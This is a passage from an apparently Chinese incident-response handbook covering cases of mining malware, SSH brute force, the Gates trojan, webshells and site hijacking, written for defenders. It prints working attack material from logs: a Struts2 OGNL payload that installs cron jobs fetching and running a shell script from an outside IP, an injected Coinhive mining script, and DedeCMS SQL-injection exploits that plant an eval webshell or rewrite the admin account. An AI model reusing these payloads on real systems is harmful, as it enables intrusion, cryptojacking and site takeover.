/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat 重启WebLogic或系统后，确认以下链接访问是否为404 http://x.x.x.x:7001/wls-wsat 0x04 防范措施​ 新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率。通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞，如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞，Struts2远程命令执行等，导致大量服务器被感染挖矿程序的现象 。总结了几种预防措施： 1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护 2、及时更新 Windows安全补丁，开启防火墙临时关闭端口 3、及时更新web漏洞补丁，升级web组件 第6篇：挖矿病毒（二）0x00 前言 作为一个运维工程师，而非一个专业的病毒分析工程师，遇到了比较复杂的病毒怎么办？别怕，虽然对二进制不熟，但是依靠系统运维的经验，我们可以用自己的方式来解决它。 0x01 感染现象1、向大量远程IP的445端口发送请求 2、使用各种杀毒软件查杀无果，虽然能识别出在C:\\Windows\\NerworkDistribution中发现异常文件，但即使删除NerworkDistribution后，每次重启又会再次生成。 连杀软清除不了的病毒，只能手工来吧，个人比较偏好火绒，界面比较简洁，功能也挺好用的，自带的火绒剑是安全分析利器。于是安装了火绒，有了如下分析排查过程。 0x02 事件分析A、网络链接通过现象，找到对外发送请求的进程ID：4960 B、进程分析进一步通过进程ID找到相关联的进程，父进程为1464 找到进程ID为1464的服务项，逐一排查，我们发现服务项RemoteUPnPService存在异常。 C、删除服务选择可疑服务项，右键属性，停止服务，启动类型：禁止。 停止并禁用服务，再清除NerworkDistribution目录后，重启计算机。异常请求和目录的现象消失。 又排查了几台，现象一致，就是服务项的名称有点变化。 D、病毒清除挖矿病毒清除过程如下： 1、 停止并禁用可疑的服务项，服务项的名称会变，但描述是不变的，根据描述可快速找到可疑服务项。 ​ 可疑服务项描述：Enables a common interface and object model for the Remote UPnP Service to access ​ 删除服务项：Sc delete RemoteUPnPService 2、 删除C:\\Windows\\NerworkDistribution目录 3、 重启计算机 4、 使用杀毒软件全盘查杀 5、 到微软官方网站下载对应操作系统补丁，下载链接： https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010 0x03 后记在查询了大量资料后，找到了一篇在2018年2月有关该病毒的报告： NrsMiner：一个构造精密的挖矿僵尸网络 https://www.freebuf.com/articles/system/162874.html 根据文章提示，这个病毒的构造非常的复杂，主控模块作为服务“Hyper-VAccess Protection Agent Service”的ServiceDll存在。但与目前处理的情况有所不同，该病毒疑似是升级了。 第五章：Linux实战篇第1篇：SSH暴力破解0x00 前言​ SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话数据进行加密，保证数据传输的安全。SSH口令长度太短或者复杂度不够，如仅包含数字，或仅包含字母等，容易被攻击者破解，一旦被攻击者获取，可用来直接登录系统，控制服务器所有权限。 0x01 应急场景​ 某天，网站管理员登录服务器进行巡检时，发现端口连接里存在两条可疑的连接记录，如下图： TCP初始化连接三次握手吧：发SYN包，然后返回SYN/ACK包，再发ACK包，连接正式建立。但是这里有点出入，当请求者收到SYS/ACK包后，就开始建立连接了，而被请求者第三次握手结束后才建立连接。 客户端TCP状态迁移： ​ CLOSED-&gt;SYN_SENT-&gt;ESTABLISHED-&gt;FIN_WAIT_1-&gt;FIN_WAIT_2-&gt;TIME_WAIT-&gt;CLOSED 服务器TCP状态迁移： ​ CLOSED-&gt;LISTEN-&gt;SYN recv-&gt;ESTABLISHED-&gt;CLOSE_WAIT-&gt;LAST_ACK-&gt;CLOSED 当客户端开始连接时，服务器还处于LISTENING，客户端发一个SYN包后，服务端接收到了客户端的SYN并且发送了ACK时，服务器处于SYN_RECV状态，然后并没有再次收到客户端的ACK进入ESTABLISHED状态，一直停留在SYN_RECV状态。 在这里，SSH（22）端口，两条外网IP的SYN_RECV状态连接，直觉告诉了管理员，这里一定有什么异常。 0x02 日志分析​ SSH端口异常，我们首先有必要先来了解一下系统账号情况： A、系统账号情况 1、除root之外，是否还有其它特权用户(uid 为0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2、可以远程登录的帐号信息 [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: 我们可以确认目前系统只有一个管理用户root。 接下来，我们想到的是/var/log/secure，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。 B、确认攻击情况： 1、统计了下日志，发现大约有126254次登录失败的记录，确认服务器遭受暴力破解 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2、输出登录爆破的第一行和最后一行，确认爆破时间范围： [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3、进一步定位有哪些IP在爆破？ [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4、爆破用户名字典都有哪些？ [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C、管理员最近登录情况： 1、登录成功的日期、用户名、IP： [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ 通过登录日志分析，并未发现异常登录时间和登录IP。 2、顺便统计一下登录成功的IP有哪些： [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。 0x04 处理措施​ SSH暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施： 1、禁止向公网开放管理端口，若必须开放应限定管理IP地址并加强口令安全审计（口令长度不低于8位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。 2、更改服务器ssh默认端口。 3、部署入侵检测设备，增强安全防护。 第2篇：捕捉短连接0x00 前言​ 短连接（short connnection）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。 0x01 应急场景​ 某天，网络管理员在出口WAF检测到某台服务器不断向香港I发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。 0x02 日志分析​ 登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。 手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。 脚本文件如下： #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print $7}' #echo $tmp if test -z \"$tmp\" then ((i=i+1)) else for pid in $tmp; do echo \"PID: \"${pid} result=ls -lh /proc/$pid|grep exe echo \"Process: \"${result} kill -9 $pid done break fi done echo \"Total number of times: \"${i} 运行结果如下： 跑了三次脚本，可以发现短连接每次发起的进程Pid一直在变，但已经捕捉到发起该异常连接的进程源文件为 /usr/lib/nfsiod 0x04 小结​ 本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。 第3篇：挖矿病毒0x00 前言​ 随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（EternalBlue）、web攻击多种漏洞（如Tomcat弱口令攻击、Weblogic WLS组件漏洞、Jboss反序列化漏洞、Struts2远程命令执行等），导致大量服务器被感染挖矿程序的现象 。 0x01 应急场景​ 某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源： ###0x02 事件分析 A、排查过程登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 : 下载logo.jpg，包含脚本内容如下： 到这里，我们可以发现攻击者下载logo.jpg并执行了里面了shell脚本，那这个脚本是如何启动的呢？ 通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。 B、溯源分析​ 在Tomcat log日志中，我们找到这样一条记录： 对日志中攻击源码进行摘录如下： {(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} 可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过Struct 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。 C、清除病毒1、删除定时任务: 2、终止异常进程: D、漏洞修复​ 升级struts到最新版本 0x03 防范措施​ 针对服务器被感染挖矿程序的现象，总结了几种预防措施： 1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护 2、及时更新 Windows安全补丁，开启防火墙临时关闭端口 3、及时更新web漏洞补丁，升级web组件 第4篇：盖茨木马0x00 前言​ Linux盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的DDoS木马，主要恶意特点是具备了后门程序，DDoS攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用Gates这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。 0x01 应急场景​ 某天，网站管理员发现服务器CPU资源异常，几个异常进程占用大量网络带宽： 0x02 事件分析异常IP连接： 异常进程： ​ 查看进行发现ps aux进程异常，进入该目录发现多个命令，猜测命令可能已被替换 登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 : 异常启动项 进入rc3.d目录可以发现多个异常进行： /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux 搜索病毒原体 find / -size -1223124c -size +1223122c -exec ls -id {} ; 搜索1223123大小的文件 从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见： Linux平台“盖茨木马”分析 http://www.freebuf.com/articles/system/117823.html 悬镜服务器卫士丨Linux平台“盖茨木马”分析 http://www.sohu.com/a/117926079_515168 手动清除木马过程： 1、简单判断有无木马 #有无下列文件 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #查看大小是否正常 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2、上传如下命令到/root下 ps netstat ss lsof 3、删除如下目录及文件 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #木马程序 rm -f /usr/bin/.sshd #木马后门 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4、找出异常程序并杀死 5、删除含木马命令并重新安装 0x03 命令替换RPM check检查： 系统完整性也可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查 ./rpm -Va &gt; rpm.log 如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, ``c 用以指配置文件, 接着是文件名. 8位字符的每一个 用以表示文件与RPM数据库中一种属性的比较结果 。``. (点) 表示测试通过。.下面的字符表示对RPM软件包进行的某种测试失败： 命令替换： rpm2cpio 包全名 | cpio -idv .文件绝对路径 rpm包中文件提取 Rpm2cpio 将rpm包转换为cpio格式的命令 Cpio 是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件 Cpio 选项 &lt; [文件|设备] -i：copy-in模式，还原 -d：还原时自动新建目录 -v：显示还原过程 文件提取还原案例： rpm -qf /bin/ls 查询ls命令属于哪个软件包 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下 cp /root/bin/ls /bin/ 把ls命令复制到/bin/目录 修复文件丢失 挂载命令rpm包： mkdir /mnt/chrom/ 建立挂载点 mount -t iso9660 /dev/cdrom /mnt/cdrom/ 挂在光盘 mount/dev/sr0 /mnt/cdrom/ 卸载命令 umount 设备文件名或挂载点 umount /mnt/cdrom/ 第5篇：DDOS病毒现象描述某服务器网络资源异常,感染该木马病毒的服务器会占用网络带宽，甚至影响网络业务正常应用。 系统分析针对日志服务器病毒事件排查情况：在开机启动项/etc/rc.d/rc.local发现可疑的sh.sh脚本，进一步跟踪sh.sh脚本,这是一个检测病毒十分钟存活的脚本。 在root目录下发现存活检测脚本 解决步骤： 结束进程 ps aux | grep “conf.m” | grep -v grep | awk ‘{print $2}‘| xargs kill -9 清除自动启动脚本 vim /etc/rc.local 去掉 sh /etc/chongfu.sh &amp; 清除 脚本 rm -rf /etc/chongfu.sh /tem/chongfu.sh 修改登录密码 passwd 重启。 reboot 第六章：Web实战篇第1篇：网站被植入Webshell网站被植入webshell，意味着网站存在可利用的高危漏洞，攻击者通过利用漏洞入侵网站，写入webshell接管网站的控制权。为了得到权限 ，常规的手段如：前后台任意文件上传，远程命令执行，Sql注入写入文件等。 现象描述网站管理员在站点目录下发现存在webshell，于是开始了对入侵过程展开了分析。 Webshell查杀工具： D盾_Web查杀Window下webshell查杀：http://www.d99net.net/index.asp 河马：支持多平台，但是需要联网环境。 使用方法:wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgztar xvf hm-linux-amd64.tgzhm scan /www 事件分析1、 定位时间范围通过发现的webshell文件创建时间点，去翻看相关日期的访问日志。 2、Web 日志分析经过日志分析，在文件创建的时间节点并未发现可疑的上传，但发现存在可疑的webservice接口 3、漏洞分析访问webservice接口，发现变量：buffer、distinctpach、newfilename可以在客户端自定义 4、漏洞复现尝试对漏洞进行复现，可成功上传webshell，控制网站服务器 5、漏洞修复清除webshell并对webservice接口进行代码修复。 从发现webshell到日志分析，再到漏洞复现和修复，本文暂不涉及溯源取证方面。 第2篇：门罗币恶意挖矿门罗币(Monero 或 XMR)，它是一个非常注重于隐私、匿名性和不可跟踪的加密数字货币。只需在网页中配置好js脚本，打开网页就可以挖矿，是一种非常简单的挖矿方式，而通过这种恶意挖矿获取数字货币是黑灰色产业获取收益的重要途径。 现象描述利用XMR恶意挖矿，会大量占用用户的CPU资源，严重影响了网站的用户体验。 从08/09日0点开始，局域网内某IP访问网站页面会触发安全预警，只要访问此服务器上的网页，CPU直线上升100% 问题解析通过获取恶意网页url，对网页页面进行分析，发现网站页面被植入在线门罗币挖矿代码： &lt;script&gt; var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); &lt;/script&gt; 删除js里面的恶意代码，网站被XMR 恶意挖矿，服务器已经被攻击，进一步做服务器入侵排查。 第3篇：批量挂黑页作为一个网站管理员，你采用开源CMS做网站，比如dedecms，但是有一天，你忽然发现不知何时，网站的友情链接模块被挂大量垃圾链接，网站出现了很多不该有的目录，里面全是博彩相关的网页。而且，攻击者在挂黑页以后，会在一些小论坛注册马甲将你的网站黑页链接发到论坛，引爬虫收录。在搜索引擎搜索网站地址时，收录了一些会出现一些博彩页面，严重影响了网站形象。 原因分析网站存在高危漏洞，常见于一些存在安全漏洞的开源CMS，利用0day批量拿站上传黑页。 现象描述：某网站被挂了非常多博彩链接，链接形式如下： ​ http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html ​ http://www.xxx.com/upload/aomendduchangzaixian/index.html ​ http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html 链接可以访问，直接访问物理路径也可以看到文件，但是打开网站目录并没有发现这些文件，这些文件到底藏在了哪？ 访问这些链接，跳转到如图页面： 问题处理：1、打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。 2、再次查看，可以看到半透明的文件夹，清楚隐藏文件夹及所有页面 3、然后清除IIS临时压缩文件 C:\\inetpub\\temp\\IIS Temporary Compressed Files\\WEBUI$^_gzip_D^\\WEB\\WEBUI\\UPLOAD 4、投诉快照，申请删除相关的网页收录，减少对网站的影响。 第4篇：新闻源网站劫持新闻源网站一般权重较高，收录快，能够被搜索引擎优先收录，是黑灰产推广引流的必争之地，很容易成为被攻击的对象。被黑以后主要挂的不良信息内容主要是博彩六合彩等赌博类内容，新闻源网站程序无论是自主开发的还是开源程序，都有被黑的可能，开源程序更容易被黑。 现象描述：某新闻源网站首页广告链接被劫持到菠菜网站 有三个广告专题，链接形式如下： ​ http://www.xxx.cn/zhuanti/yyysc/index.shtml ​ http://www.xxx.cn/zhuanti/wwwsc/index.shtml ​ http://www.xxx.cn/zhuanti/zzzsc/index.shtml 点击这三条链接会跳转到博彩网站。简单抓包分析一下过程： 可以发现此时这个返回页面已被劫持，并且加载了第三方js文件，http://xn--dpqw2zokj.com/N/js/dt.js，进一步访问该文件： dt.js进一步加载了另一条js，访问http://xn--dpqw2zokj.com/N/js/yz.js 我们发现链接跳转到https://lemcoo.com/?dt，进一步访问这个链接，网站为博彩链接导航网站，访问后会随机跳转到第三方赌博网站。 问题处理：找到url对应的文件位置，即使文件被删除，链接依然可以访问，可以发现三条链接都是以“sc”后缀。 对Nginx配置文件进行排查，发现Nginx配置文件VirtualHost.conf被篡改，通过反向代理匹配以“sc”后缀的专题链接，劫持到http://103.233.248.163，该网站为博彩链接导航网站。 删除恶意代理后，专题链接访问恢复。 第5篇：移动端劫持PC端访问正常，移动端访问出现异常，比如插入弹窗、嵌入式广告和跳转到第三方网站，将干扰用户的正常使用，对用户体验造成极大伤害。 现象描述部分网站用户反馈，手机打开网站就会跳转到赌博网站。 问题处理访问网站首页，抓取到了一条恶意js： http://js.zadovosnjppnywuz.com/caonima.js 我们可以发现，攻击者通过这段js代码判断手机访问来源，劫持移动端（如手机、ipad、Android等）流量，跳转到https://262706.com。 进一步访问https://262706.com，跳转到赌博网站： 第6篇：搜索引擎劫持​ 当你直接打开网址访问网站，是正常的，可是当你在搜索引擎结果页中打开网站时，会跳转到一些其他网站，比如博彩，虚假广告，淘宝搜索页面等。是的，你可能了遇到搜索引擎劫持。 现象描述从搜索引擎来的流量自动跳转到指定的网页 问题处理通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。 进一步跟着include函数包含的文件，index,php包含/tmp/.ICE-unix/.. /c.jpg。 进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。 第7篇：网站首页被篡改​ 网站首页被非法篡改，是的，就是你一打开网站就知道自己的网站出现了安全问题，网站程序存在严重的安全漏洞，攻击者通过上传脚本木马，从而对网站内容进行篡改。而这种篡改事件在某些场景下，会被无限放大。 现象描述网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。 问题处理1、确认篡改时间 通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。 2、访问日志溯源 通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。 进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。 image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。 3、寻找真相 我们在网站根目录找到了答案，发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-2810:35。 通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）。 根据这几个时间节点，我们尝试去还原攻击者的攻击路径。 但是我们在访问日志并未找到ROOT.rar的访问下载记录，访问日志只保留了近一年的记录，而这个webshell可能已经存在了多年。 黑客是如何获取webshell的呢？ 可能是通过下载ROOT.rar全站源码备份文件获取到其中存在的木马信息，或者几年前入侵并潜藏了多年，又或者是从地下黑产购买了shell，我们不得而知。 本文的示例中攻击者为我们留下了大量的证据和记录，而更多时候，攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。 第8篇：管理员账号被篡改​ 你是某一个网站的管理员，有一天，你的管理员账号admin却登录不了，进入数据库查看，原来管理员账号用户名不存在了，却多了另外一个管理员用户名。不对，不是新增了管理员，而是你的管理员用户名被篡改了。 现象描述前后端分离，后台只允许内网访问，管理员账号admin却依然被多次被篡改 问题处理1、网站webshell 在针对网站根目录进行webshell扫描，发现存在脚本木马，创建时间为2018-06-13 04:30:30 2、 定位IP 通过木马创建时间， 查看网站访问日志，定位到IP为：180.xx.xx.3 3、关联分析 全局搜索与该IP有关的操作日志： 在脚本木马生成前，有两条比较可疑的访问日志吸引了我们的注意： 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35 HTTP/1.1\" 200 67 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/ad_js.php?aid=19 HTTP/1.1\" 200 32 对这段POC进行解码，我们发现通过这个poc可以往数据库中插入数据，进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。 解码后： cfg_dbprefixmyadSETnormbody= '&lt;?php file_put_contents(''read.php'',''&lt;?php eval($_POST[x]);echo mOon;?&gt;'');?&gt;' WHEREaid` =19 # 综上，可以推测/plus/download.php中可能存在SQL注入漏洞，接下来，收集网上已公开的有以下3种EXP进行漏洞复现。 漏洞复现利用方式一：修改后台管理员 1、新建管理员账号test/test123789，可以成功登录网站后台 2、构造如下注入SQL语句： cfg_dbprefixadmin SETuserid='spider',pwd=’f297a57a5a743894a0e4’ where id=19 #` 修改后台管理员为：用户名spider，密码admin。 （3）对应的EXP: ？open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=115&amp;arrs2[]=112&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;a